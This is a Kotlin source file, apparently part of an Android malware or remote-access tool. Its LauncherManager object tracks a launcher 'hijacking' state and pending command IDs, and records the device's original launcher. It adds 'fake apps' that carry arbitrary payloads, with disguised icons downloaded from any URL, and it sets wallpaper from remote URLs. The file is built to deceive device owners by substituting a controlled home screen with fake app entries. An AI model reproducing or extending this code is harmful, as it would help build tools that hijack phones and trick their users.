package com.example.myandroid

import android.content.Context
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import java.io.File
import java.io.FileOutputStream
import java.net.URL

object LauncherManager {
    var isHijacking: Boolean = false
    var pendingCmdId: Int = -1
    var expectedMode: String = ""

    fun getStoredPreviousLabel(ctx: Context): String? {
        val prefs = ctx.getSharedPreferences("app_stats", Context.MODE_PRIVATE)
        val pkg = prefs.getString("original_launcher_package", null) ?: return null
        return try {
            val pm = ctx.packageManager
            pm.getApplicationLabel(pm.getApplicationInfo(pkg, 0)).toString()
        } catch (e: Exception) { null }
    }

    fun isEnabled(ctx: Context): Boolean {
        return ctx.getSharedPreferences("launcher_prefs", Context.MODE_PRIVATE).getBoolean("active", false)
    }

    fun setEnabled(ctx: Context, active: Boolean) {
        ctx.getSharedPreferences("launcher_prefs", Context.MODE_PRIVATE).edit().putBoolean("active", active).apply()
    }

    suspend fun addFakeApp(ctx: Context, mode: String, method: String, name: String, iconUrl: String, payload: String): Boolean {
        return withContext(Dispatchers.IO) {
            try {
                val id = java.util.UUID.randomUUID().toString()
                val targetFile = File(ctx.filesDir, "fake_icon_$id.png")
                
                if (iconUrl.startsWith("http")) {
                    URL(iconUrl).openStream().use { input ->
                        FileOutputStream(targetFile).use { output -> input.copyTo(output) }
                    }
                } else {
                    val srcFile = File(iconUrl)
                    if (srcFile.exists()) {
                        srcFile.inputStream().use { input ->
                            FileOutputStream(targetFile).use { output -> input.copyTo(output) }
                        }
                    }
                }

                val prefs = ctx.getSharedPreferences("launcher_prefs", Context.MODE_PRIVATE)
                val arr = org.json.JSONArray(prefs.getString("fake_apps", "[]"))
                val obj = org.json.JSONObject().apply {
                    put("id", id)
                    put("mode", mode.uppercase())
                    put("method", method.uppercase())
                    put("name", name)
                    put("icon_path", targetFile.absolutePath)
                    put("payload", payload)
                }
                arr.put(obj)
                prefs.edit().putString("fake_apps", arr.toString()).apply()
                AppCache.invalidate()
                true
            } catch (e: Exception) {
                DebugLogger.log("FAKE_APP_ERR", e.message ?: "Unknown")
                false
            }
        }
    }

    fun removeFakeApp(ctx: Context, name: String) {
        val prefs = ctx.getSharedPreferences("launcher_prefs", Context.MODE_PRIVATE)
        val arr = org.json.JSONArray(prefs.getString("fake_apps", "[]"))
        val newArr = org.json.JSONArray()
        for (i in 0 until arr.length()) {
            val f = arr.getJSONObject(i)
            if (f.getString("name").equals(name, true)) {
                File(f.getString("icon_path")).delete()
            } else {
                newArr.put(f)
            }
        }
        prefs.edit().putString("fake_apps", newArr.toString()).apply()
        AppCache.invalidate()
    }

    suspend fun applyWallpaper(ctx: Context, pathOrUrl: String) {
        withContext(Dispatchers.IO) {
            val targetFile = File(ctx.filesDir, "launcher_wallpaper.jpg")
            try {
                if (pathOrUrl.startsWith("http")) {
                    URL(pathOrUrl).openStream().use { input ->
                        FileOutputStream(targetFile).use { output -> input.copyTo(output) }
                    }
                } else if (pathOrUrl.startsWith("/")) {
                    val srcFile = File(pathOrUrl)
                    if (srcFile.exists()) {
                        srcFile.inputStream().use { input ->
                            FileOutputStream(targetFile).use { output -> input.copyTo(output) }
                        }
                    } else {
                        DebugLogger.log("LAUNCHER_WALL", "Local wallpaper file not found: $pathOrUrl")
                    }
                } else {
                    DebugLogger.log("LAUNCHER_WALL", "Invalid path or URL format: $pathOrUrl")
                }
            } catch (e: Exception) {
                DebugLogger.log("LAUNCHER_ERR", "Wallpaper apply failed: ${e.message}")
            }
        }
    }
}
